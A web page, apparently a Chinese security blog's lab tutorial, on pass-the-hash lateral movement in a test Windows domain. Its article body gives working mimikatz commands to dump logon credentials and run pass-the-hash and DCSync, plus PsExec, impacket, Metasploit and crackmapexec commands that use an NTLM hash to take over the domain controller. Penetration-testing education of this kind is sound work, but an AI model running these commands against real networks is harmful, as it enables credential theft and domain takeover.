@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>内网渗透4之PTH | zyth0n的博客</title>
+  <meta name="description" content="PTH（pass-the-hash，哈希传递）在内网渗透中是一种很经典的攻击方式，原理是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。在Windows系统中，通常会使用NTLM身份认证，NTLM是明文加密后的hash值。PTH是基于SMB服务(445端口)。这类攻击尤其适用于域环境或工作组环境，同时可以获得hash但是不允许对hash爆破，或者">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透4之PTH">
+<meta property="og:url" content="https://zyth0n.github.io/2023/01/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F4%E4%B9%8BPTH/index.html">
+<meta property="og:site_name" content="zyth0n的博客">
+<meta property="og:description" content="PTH（pass-the-hash，哈希传递）在内网渗透中是一种很经典的攻击方式，原理是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。在Windows系统中，通常会使用NTLM身份认证，NTLM是明文加密后的hash值。PTH是基于SMB服务(445端口)。这类攻击尤其适用于域环境或工作组环境，同时可以获得hash但是不允许对hash爆破，或者">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/01/17/TPH6krgbjquxEeh.png">
+<meta property="og:image" content="https://s2.loli.net/2023/01/17/l8TR4vEXMHWNAz6.png">
+<meta property="og:image" content="https://s2.loli.net/2023/01/17/g8phBvUKYsS15ey.png">
+<meta property="og:image" content="https://s2.loli.net/2023/01/17/5kKhsOAfBFe8EGR.png">
+<meta property="og:image" content="https://s2.loli.net/2023/01/17/Zi7uF9lShvsMYo6.png">
+<meta property="og:image" content="https://s2.loli.net/2023/01/17/k5OHZzeKaG9DQAt.png">
+<meta property="article:published_time" content="2023-01-19T00:59:40.399Z">
+<meta property="article:modified_time" content="2023-01-17T12:30:36.000Z">
+<meta property="article:author" content="zyth0n">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="横向渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/01/17/TPH6krgbjquxEeh.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://zyth0n.github.io/2023/01/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F4%E4%B9%8BPTH/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="zyth0n的博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/zyth0n" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">zyth0n</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">追寻信息安全的狂热者</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Somewhere In Your Heart</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/zyth0n" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>只求同好，无关浮名</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91/">内网</a><span class="category-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/" rel="tag">横向渗透</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 13px;">信息收集</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 14px;">内网渗透</a> <a href="/tags/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/" style="font-size: 13px;">横向渗透</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">一月 2023</a><span class="archive-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E5%86%85%E7%BD%91/">内网</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/01/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F4%E4%B9%8BPTH/" class="title">内网渗透4之PTH</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-01-19T00:59:40.399Z" itemprop="datePublished">2023-01-19</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E5%86%85%E7%BD%91/">内网</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/01/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F3%E4%B9%8Btoken%E7%AA%83%E5%8F%96/" class="title">内网渗透3之token窃取</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-01-19T00:59:40.103Z" itemprop="datePublished">2023-01-19</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E5%86%85%E7%BD%91/">内网</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/01/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F1%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="title">内网渗透1之环境搭建</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-01-19T00:59:39.916Z" itemprop="datePublished">2023-01-19</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E5%86%85%E7%BD%91/">内网</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/01/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F2%E4%B9%8B%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="title">内网渗透2之基本信息收集</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-01-19T00:59:39.751Z" itemprop="datePublished">2023-01-19</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+  <aside class="sidebar sidebar-toc collapse   in  " id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">文章目录</h3>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#mimikatz"><span class="toc-number">1.</span> <span class="toc-text">mimikatz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Psexec"><span class="toc-number">2.</span> <span class="toc-text">Psexec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text"></span></a></li></ol>
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-内网渗透4之PTH" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      内网渗透4之PTH
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2023/01/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F4%E4%B9%8BPTH/" class="article-date">
+	  <time datetime="2023-01-19T00:59:40.399Z" itemprop="datePublished">2023-01-19</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91/">内网</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>, <a class="article-tag-link-link" href="/tags/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/" rel="tag">横向渗透</a>
+  </span>
+
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/01/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F4%E4%B9%8BPTH/#comments" class="article-comment-link">评论</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 1.2k(字)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 4(分)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <p>PTH（pass-the-hash，哈希传递）在内网渗透中是一种很经典的攻击方式，原理是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。在Windows系统中，通常会使用NTLM身份认证，NTLM是明文加密后的hash值。PTH是基于SMB服务(445端口)。这类攻击尤其适用于<strong>域环境或工作组环境，同时可以获得hash但是不允许对hash爆破，或者内网中存在其他一样密码主机的情形（部分软件可以直接爆出明文密码）</strong>。这里注意一点，如果是在域环境中，只能是域管理员组内用户(<strong>可以是域管理员组内非 administrator 用户</strong>)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器。当然了，非管理用户也可以进行攻击，只不过相当于没攻击。也就是说，要想成功进行PTH攻击，必须要获取一台<strong>高权限的主机</strong>。</p>
+<p>这篇文章搭建的域环境信息如下，网卡选择“NAT网络”</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>类型</th>
+<th>IP</th>
+<th>系统</th>
+<th>域名</th>
+<th>域用户账号</th>
+<th>机器名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DC</td>
+<td>域控</td>
+<td>10.0.2.4</td>
+<td>Windows Server 2016</td>
+<td>ZYTH0N</td>
+<td>administrator</td>
+<td>16DC</td>
+</tr>
+<tr>
+<td>USER</td>
+<td>域成员</td>
+<td>10.0.2.5</td>
+<td>Win10</td>
+<td>无</td>
+<td>test</td>
+<td>16WIN10</td>
+</tr>
+</tbody></table>
+<p>具体有以下几种攻击方式：</p>
+<h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz" title="项目链接">mimikatz</a></h2><p>这里以我搭建的测试环境举例，现在的情况是，我已经拿到了USER的<strong>管理员权限</strong>（如果不以管理员权限运行mimikatz，则会出现<code>ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061</code>的错误），先获取hash，这里我密码设置的过于简单，在kerberos这里已经显示出明文密码了：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonpasswords</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/01/17/TPH6krgbjquxEeh.png" alt="2023-01-17_17-14.png"></p>
+<p>然后用mimikatz执行PTH攻击，执行之后会跳出一个cmd窗口，该窗口拥有<strong>访问域控</strong>的权限，之后访问远程主机或服务不需要提供明文密码（当然仅限于这个shell之内），这里演示一下访问域控的C盘：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">sekurlsa::<span class="title">pth</span> /<span class="title">user:administrator</span> /<span class="title">domain:ZYTH0N</span> /<span class="title">ntlm</span>:0445<span class="title">e2d2c6f140371b1dcbf3521719ca</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/01/17/l8TR4vEXMHWNAz6.png" alt="2023-01-17_17-23.png"></p>
+<p>在这里补充一下，如果使用一个<strong>非管理员账户</strong>进行PTH攻击，在生成的cmd里访问域控C盘依然需要输入账号和密码（所以为什么会说攻击了相当于没攻击）：<br><img src="https://s2.loli.net/2023/01/17/g8phBvUKYsS15ey.png" alt="2023-01-17_17-34.png"></p>
+<p>这个命令可以导出域内所有用户的hash：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">lsadump::<span class="title">dcsync</span> /<span class="title">domain:shqax</span>.<span class="title">com</span> /<span class="title">all</span> /<span class="title">csv</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/01/17/5kKhsOAfBFe8EGR.png" alt="2023-01-17_17-50.png"><br>上面的命令都是建立在<strong>交互式shell</strong>的基础上，如果是在<strong>非交互式shell</strong>的基础上则对于命令需要做一点小调整：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#获取hash</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &gt; password.txt</span><br><span class="line"></span><br><span class="line">#执行攻击</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:ZYTH0N /ntlm:<span class="number">0445</span>e2d2c6f140371b1dcbf3521719ca&quot;</span><br><span class="line"></span><br><span class="line">#导出域内所有用户hash</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:zyth0n.cc /all /csv&quot;</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/psexec" title="项目链接">Psexec</a></h2><p>上面提到的mimkatz有一个缺点：不免杀。Psexec属于微软官方提供的进程实用工具，一般情况下不存在被查杀的可能，其基本原理是通过管道在远程目标主机上创建一个psexec 服务,并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件,然后通过psexec 服务运行命令,运行结束后删除服务。psexec的利用条件同样需要开启IPC共享服务，同时远程管理系统需要开启admin$共享（默认开启）。注意，<strong>Psexec不需要管理员权限</strong>。演示两种攻击方式：</p>
+<ol>
+<li>明文账号密码都知道，这里可以看到我们拿到的是<strong>域控的SYSTEM权限</strong>：</li>
+</ol>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#没有IPC连接需要账号密码</span><br><span class="line">PsExec64.exe -accepteula -s \\<span class="number">10</span>.<span class="number">0</span>.<span class="number">2</span>.<span class="number">4</span> -u Administrator -p <span class="number">12</span>qweASDzxc <span class="built_in">cmd</span></span><br><span class="line"></span><br><span class="line">#有IPC连接无需账号密码</span><br><span class="line">PsExec64.exe -accepteula -s \\<span class="number">10</span>.<span class="number">0</span>.<span class="number">2</span>.<span class="number">4</span> <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/01/17/Zi7uF9lShvsMYo6.png" alt="2023-01-17_18-19.png"></p>
+<p>解释一下各个参数的含义：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-accepteula</td>
+<td>此标志禁止显示许可证对话框</td>
+</tr>
+<tr>
+<td>-s</td>
+<td>在系统帐户中运行远程进程</td>
+</tr>
+<tr>
+<td>-u</td>
+<td>指定用于登录到远程计算机的可选用户名</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>指定用户名的可选密码。 如果省略此项，系统会提示输入隐藏的密码</td>
+</tr>
+</tbody></table>
+<ol start="2">
+<li>知道账号对应的hash:</li>
+</ol>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe -hashes :<span class="number">0445</span>e2d2c6f140371b1dcbf3521719ca zyth0n.cc/Administrator@<span class="number">10</span>.<span class="number">0</span>.<span class="number">2</span>.<span class="number">4</span></span><br></pre></td></tr></table></figure>
+
+<p>这里可能会出现“系统找不到指定文件”的错误，可以使用<strong>kali中基于python的impacket</strong>进行利用：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec -hashes :<span class="number">0445</span>e2d2c6f140371b1dcbf3521719ca zyth0n.cc/Administrator@<span class="number">10</span>.<span class="number">0</span>.<span class="number">2</span>.<span class="number">4</span></span><br></pre></td></tr></table></figure>
+
+<p>或者使用<strong>msf中自带的psexec模块</strong>进行利用也可以，结果如图所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> SMBUser Administrator</span><br><span class="line"><span class="built_in">set</span> rhosts 10.0.2.4</span><br><span class="line"><span class="built_in">set</span> smbpass aad3b435b51404eeaad3b435b51404ee（这里可以随便写）:0445e2d2c6f140371b1dcbf3521719ca（这里写密码也可以，不过既然知道密码了也没必要用这个模块攻击了）</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/01/17/k5OHZzeKaG9DQAt.png" alt="2023-01-17_20-08.png"></p>
+<p>如果需要针对一个<strong>C段进行批量PTH</strong>，这里使用<a target="_blank" rel="noopener" href="https://github.com/Porchetta-Industries/CrackMapExec" title="项目链接">crackmapexec</a>，当然kali自带，具体语句如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.0/24 -u administrator -H 0445e2d2c6f140371b1dcbf3521719ca</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://zyth0n.github.io/2023/01/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F4%E4%B9%8BPTH/" title="内网渗透4之PTH" target="_blank" rel="external">https://zyth0n.github.io/2023/01/19/内网渗透4之PTH/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/zyth0n" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/zyth0n" target="_blank"><span class="text-dark">zyth0n</span><small class="ml-1x">追寻信息安全的狂热者</small></a></h3>
+        <div>知白守黑</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2023/01/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F3%E4%B9%8Btoken%E7%AA%83%E5%8F%96/" title="内网渗透3之token窃取"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+    <li class="toggle-toc">
+      <a class="toggle-btn " data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button">    <span>[&nbsp;</span><span>文章目录</span>
+        <i class="text-collapsed icon icon-anchor"></i>
+        <i class="text-in icon icon-close"></i>
+        <span>]</span>
+      </a>
+    </li>
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/zyth0n" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+
+
+
+
+
+
+</body>
+</html>
